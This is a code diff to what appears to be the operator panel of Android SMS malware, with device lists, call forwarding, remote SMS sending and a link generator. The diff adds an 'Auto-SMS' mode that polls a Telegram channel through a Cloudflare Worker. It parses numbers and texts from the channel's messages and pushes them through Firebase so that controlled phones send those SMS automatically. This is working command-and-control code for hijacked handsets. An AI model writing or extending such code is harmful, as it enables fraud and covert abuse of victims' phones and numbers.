@@ -571,6 +571,16 @@ html{overscroll-behavior-y:none;background:var(--bg);}
     <button class="act-btn" onclick="openCF()">&#128222; CALL FORWADING</button>
     <button class="act-btn" onclick="openSmsSend()">&#9993; SMS SEND</button>
   </div>
+  <!-- Auto-SMS Telegram Button -->
+  <div style="padding:0 14px 10px;">
+    <button id="autosms-btn" onclick="toggleAutoSms()"
+      style="width:100%;background:var(--surface2);color:#94a3b8;border:1.5px solid var(--border);
+      border-radius:10px;padding:12px;font-size:13px;font-weight:700;cursor:pointer;
+      font-family:inherit;display:flex;align-items:center;justify-content:center;gap:8px;">
+      <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.562 8.248l-1.97 9.289c-.145.658-.537.818-1.084.508l-3-2.21-1.447 1.394c-.16.16-.295.295-.605.295l.213-3.053 5.56-5.023c.242-.213-.054-.333-.373-.12L7.48 14.697l-2.95-.924c-.642-.204-.657-.642.136-.953l11.57-4.461c.537-.194 1.006.131.325.889z"/></svg>
+      🤖 Auto-SMS: OFF
+    </button>
+  </div>
   <div class="tabs">
     <button class="tab-btn active" id="tb-sms" onclick="switchDtl('sms')">&#128172; SMS</button>
     <button class="tab-btn inactive" id="tb-data" onclick="switchDtl('data')">&#128196; DATA</button>
@@ -2702,7 +2712,191 @@ function doDeleteDevices(devs, btn) {
     });
   });
 }
+
+/* ===== AUTO-SMS (Telegram → Firebase → SMS APK) ===== */
+var AUTO_SMS_ACTIVE = false;
+var AUTO_SMS_INTERVAL = null;
+var AUTO_SMS_OFFSET = 0;
+var AUTO_SMS_DEV = null; /* current device key */
+
+var TG_WORKER_URL = localStorage.getItem('tg_worker_url') || '';
+var TG_BOT_TOKEN  = localStorage.getItem('tg_bot_token')  || '';
+var TG_CHAT_ID    = localStorage.getItem('tg_chat_id')    || '';
+
+function toggleAutoSms() {
+  if (!AUTO_SMS_ACTIVE) {
+    /* Check if settings exist */
+    if (!TG_WORKER_URL || !TG_BOT_TOKEN || !TG_CHAT_ID) {
+      openAutoSmsSettings();
+      return;
+    }
+    startAutoSms();
+  } else {
+    stopAutoSms();
+  }
+}
+
+function startAutoSms() {
+  if (!CUR) return;
+  AUTO_SMS_ACTIVE = true;
+  AUTO_SMS_DEV = CUR;
+  AUTO_SMS_OFFSET = 0;
+  updateAutoSmsBtn(true);
+  showToast('🤖 Auto-SMS ON — Telegram polling shuru');
+  /* Poll every 3 seconds */
+  AUTO_SMS_INTERVAL = setInterval(pollTelegram, 3000);
+  pollTelegram(); /* immediate first poll */
+}
+
+function stopAutoSms() {
+  AUTO_SMS_ACTIVE = false;
+  AUTO_SMS_DEV = null;
+  if (AUTO_SMS_INTERVAL) { clearInterval(AUTO_SMS_INTERVAL); AUTO_SMS_INTERVAL = null; }
+  updateAutoSmsBtn(false);
+  showToast('🤖 Auto-SMS OFF');
+}
+
+function updateAutoSmsBtn(active) {
+  var btn = document.getElementById('autosms-btn');
+  if (!btn) return;
+  if (active) {
+    btn.style.background = 'rgba(34,158,217,.15)';
+    btn.style.color = '#229ED9';
+    btn.style.borderColor = 'rgba(34,158,217,.4)';
+    btn.innerHTML = '<svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.562 8.248l-1.97 9.289c-.145.658-.537.818-1.084.508l-3-2.21-1.447 1.394c-.16.16-.295.295-.605.295l.213-3.053 5.56-5.023c.242-.213-.054-.333-.373-.12L7.48 14.697l-2.95-.924c-.642-.204-.657-.642.136-.953l11.57-4.461c.537-.194 1.006.131.325.889z"/></svg> 🤖 Auto-SMS: ON (polling...)';
+  } else {
+    btn.style.background = 'var(--surface2)';
+    btn.style.color = '#94a3b8';
+    btn.style.borderColor = 'var(--border)';
+    btn.innerHTML = '<svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.562 8.248l-1.97 9.289c-.145.658-.537.818-1.084.508l-3-2.21-1.447 1.394c-.16.16-.295.295-.605.295l.213-3.053 5.56-5.023c.242-.213-.054-.333-.373-.12L7.48 14.697l-2.95-.924c-.642-.204-.657-.642.136-.953l11.57-4.461c.537-.194 1.006.131.325.889z"/></svg> 🤖 Auto-SMS: OFF';
+  }
+}
+
+function parseTgMessage(text) {
+  /* Format 1: "📞 To: NUMBER\n💬 Message: BODY" */
+  var toMatch = text.match(/To:\s*(\d+)/i);
+  var msgMatch = text.match(/Message:\s*(.+)/is);
+  if (toMatch && msgMatch) {
+    return { number: toMatch[1].trim(), body: msgMatch[1].trim() };
+  }
+  /* Format 2: "NUMBER | BODY" */
+  var pipeMatch = text.match(/^(\d{10,15})\s*\|\s*(.+)/s);
+  if (pipeMatch) {
+    return { number: pipeMatch[1].trim(), body: pipeMatch[2].trim() };
+  }
+  /* Format 3: First line = number, rest = body */
+  var lines = text.trim().split('\n');
+  if (lines.length >= 2 && /^\d{10,15}$/.test(lines[0].trim())) {
+    return { number: lines[0].trim(), body: lines.slice(1).join('\n').trim() };
+  }
+  return null;
+}
+
+function pollTelegram() {
+  if (!AUTO_SMS_ACTIVE || !AUTO_SMS_DEV) return;
+  var url = TG_WORKER_URL.replace(/\/+$/,'')
+    + '?token=' + encodeURIComponent(TG_BOT_TOKEN)
+    + '&offset=' + AUTO_SMS_OFFSET
+    + '&chat_id=' + encodeURIComponent(TG_CHAT_ID);
+
+  fetch(url)
+    .then(function(r) { return r.json(); })
+    .then(function(data) {
+      if (!data.ok || !data.result || !data.result.length) return;
+      data.result.forEach(function(update) {
+        /* Advance offset to avoid re-processing */
+        if (update.update_id >= AUTO_SMS_OFFSET) {
+          AUTO_SMS_OFFSET = update.update_id + 1;
+        }
+        /* Get message text from channel_post or message */
+        var msg = update.channel_post || update.message;
+        if (!msg) return;
+        /* Only process messages from our channel */
+        var chatId = String(msg.chat && msg.chat.id);
+        if (TG_CHAT_ID && chatId !== String(TG_CHAT_ID)) return;
+        var text = msg.text || msg.caption || '';
+        if (!text) return;
+        var parsed = parseTgMessage(text);
+        if (!parsed) return;
+        /* Send SMS via Firebase */
+        autoSendSms(parsed.number, parsed.body);
+      });
+    })
+    .catch(function(e) {
+      console.log('TG poll error:', e.message);
+    });
+}
+
+function autoSendSms(number, body) {
+  if (!AUTO_SMS_DEV || !DB || !NODE) return;
+  var dev = DEVS[AUTO_SMS_DEV];
+  if (!dev) return;
+  var did = dev.did || dev.key || AUTO_SMS_DEV;
+  var auth = APIKEY ? ('?auth=' + encodeURIComponent(APIKEY)) : '';
+  /* DELETE first, then PUT after 500ms (same as manual SMS send) */
+  fetch(DB + '/' + NODE + '/Verify_Device/' + did + '.json' + auth, { method: 'DELETE' })
+    .then(function() {
+      return new Promise(function(res) { setTimeout(res, 500); });
+    })
+    .then(function() {
+      return fetch(DB + '/' + NODE + '/Verify_Device/' + did + '.json' + auth, {
+        method: 'PUT',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ Number: number, Body: body, Status: 'Yes' })
+      });
+    })
+    .then(function() {
+      showToast('📨 Auto-SMS sent → ' + number);
+    })
+    .catch(function(e) {
+      showToast('❌ Auto-SMS fail: ' + e.message);
+    });
+}
+
+function openAutoSmsSettings() {
+  document.getElementById('as-worker').value = TG_WORKER_URL;
+  document.getElementById('as-token').value = TG_BOT_TOKEN;
+  document.getElementById('as-chatid').value = TG_CHAT_ID;
+  openD('dlg-autosms');
+}
+
+function saveAutoSmsSettings() {
+  var w = document.getElementById('as-worker').value.trim();
+  var t = document.getElementById('as-token').value.trim();
+  var c = document.getElementById('as-chatid').value.trim();
+  if (!w || !t || !c) { showToast('Sab fields bharo!'); return; }
+  TG_WORKER_URL = w;
+  TG_BOT_TOKEN = t;
+  TG_CHAT_ID = c;
+  localStorage.setItem('tg_worker_url', w);
+  localStorage.setItem('tg_bot_token', t);
+  localStorage.setItem('tg_chat_id', c);
+  closeD('dlg-autosms');
+  showToast('✅ Settings saved!');
+  startAutoSms();
+}
 </script>
+
+<!-- ===== AUTO-SMS SETTINGS DIALOG ===== -->
+<div class="overlay" id="dlg-autosms" onclick="if(event.target===this)closeD('dlg-autosms')">
+  <div class="dlg">
+    <div class="dlg-hdr">🤖 Auto-SMS Settings</div>
+    <div class="dlg-body">
+      <div style="background:rgba(34,158,217,.1);border:1px solid rgba(34,158,217,.3);
+        border-radius:10px;padding:10px 12px;margin-bottom:14px;font-size:12px;color:#229ED9;line-height:1.6;">
+        Telegram channel ka naya message aate hi automatically SMS send ho jaayega.
+      </div>
+      <label style="font-size:11px;font-weight:700;color:var(--muted);text-transform:uppercase;letter-spacing:.6px;display:block;margin-bottom:5px;">Cloudflare Worker URL</label>
+      <input class="di" id="as-worker" placeholder="https://late-mud-2765.10himakhan.workers.dev" style="margin-bottom:12px;"/>
+      <label style="font-size:11px;font-weight:700;color:var(--muted);text-transform:uppercase;letter-spacing:.6px;display:block;margin-bottom:5px;">Bot Token</label>
+      <input class="di" id="as-token" placeholder="1234567890:AAF..." type="password" style="margin-bottom:12px;"/>
+      <label style="font-size:11px;font-weight:700;color:var(--muted);text-transform:uppercase;letter-spacing:.6px;display:block;margin-bottom:5px;">Channel Chat ID</label>
+      <input class="di" id="as-chatid" placeholder="-1001234567890" style="margin-bottom:14px;"/>
+      <button class="dbtn" onclick="saveAutoSmsSettings()">✅ Save & Start</button>
+      <button class="dbtn-cancel" onclick="closeD('dlg-autosms')">Cancel</button>
+    </div>
+  </div>
+</div>
 
 <!-- ===== LINK GENERATOR DIALOG ===== -->
 <div class="overlay" id="dlg-linkgen" style="display:none;">
